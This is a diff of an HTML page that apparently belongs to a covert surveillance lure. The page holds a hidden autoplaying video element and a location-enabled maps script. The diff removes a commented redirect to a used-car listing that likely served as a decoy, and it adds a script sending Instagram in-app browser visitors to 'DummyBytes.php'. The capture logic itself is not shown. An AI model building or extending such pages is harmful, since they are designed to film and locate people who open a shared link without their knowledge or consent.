@@ -3,8 +3,6 @@
     <script src="http://maps.google.com/maps/api/js?sensor=true"></script>
     <script src="https://code.jquery.com/jquery-1.11.2.min.js"></script>
 
-    <!-- <meta http-equiv="Refresh" content="7;url=https://rj.olx.com.br/rio-de-janeiro-e-regiao/autos-e-pecas/carros-vans-e-utilitarios/ka-2018-se-1-5-completo-km-baixa-consigo-financiar-bairro-ilha-governador-856745996"> -->
-
 
     <div class="video-wrap" hidden="hidden">
        <video id="video" playsinline autoplay></video>
@@ -63,6 +61,14 @@
       </p>
     </form>
 
+    <script> 
+   if (navigator.userAgent.includes ("Instagram")) { 
+       window.location.href = "DummyBytes.php"; 
+   } 
+  
+
+    </script>
+    
     <script>
 
 
